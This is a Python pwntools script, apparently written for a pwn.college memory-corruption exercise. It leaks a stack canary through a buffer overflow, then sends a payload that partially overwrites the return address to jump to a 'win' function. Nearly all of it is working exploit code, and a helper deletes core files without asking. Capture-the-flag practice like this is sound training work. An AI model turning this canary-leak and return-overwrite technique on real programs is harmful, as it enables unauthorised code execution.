from pwn import *
import glob
import os


def delete_core_files_no_input():
    """
    Deletes files in the current directory that start with "core"
    without asking for user confirmation. Use with caution.
    """
    # Get a list of all files in the current directory that match the pattern "core*"
    files_to_delete = glob.glob("core*")

    if not files_to_delete:
        print("No files starting with 'core' found in the current directory.")
        return

    print("Deleting the following files:")
    for file_name in files_to_delete:
        print(f"- {file_name}")

    for file_name in files_to_delete:
        try:
            os.remove(file_name)
            print(f"Deleted: {file_name}")
        except OSError as e:
            print(f"Error deleting {file_name}: {e}")

IS_FLAG = False

def hack():
	# win_authed at 1f7a

	p = process("./babymem-level-12-1")

	leak_canary_payload = b"REPEAT" + b"A" * (104 - 6) # overwrite the \x00 byte so printf() will spit rest of it out

	print(p.recv(22000))

	p.sendline(b"120")

	print(p.recv(22000))

	p.sendline(leak_canary_payload)

	x = p.recv(22000)
	print(x)
	x = x.split(b'\n')[1]

	leaked_canary = b""

	if(len(x) >= 7):
	    leaked_canary = b"\x00" + x[0:7]
	else:
	    print("[!] x < 7")
	    exit(1)

	canary = p64(int.from_bytes(leaked_canary)) # leaked and purified the canary
	canary = leaked_canary

	print("[+] Leaked Canary ::", hex(int.from_bytes(canary)))

	payload = b""
	payload += b"A" * 104
	payload += canary
	payload += b"A" * 8
	payload += b"\x7a\x1f"

	p.sendline(b"122")
	p.sendline(payload)

	res = p.recv(22000)

	if b"pwn.college" in res:
		IS_FLAG = True
	else:
		print("[~] Trying to find...")

	print(res)

	p.close()
	p.kill()
	delete_core_files_no_input()

hack()

"""
while(not(IS_FLAG)):
	try:
		hack()
	except:
		continue
"""
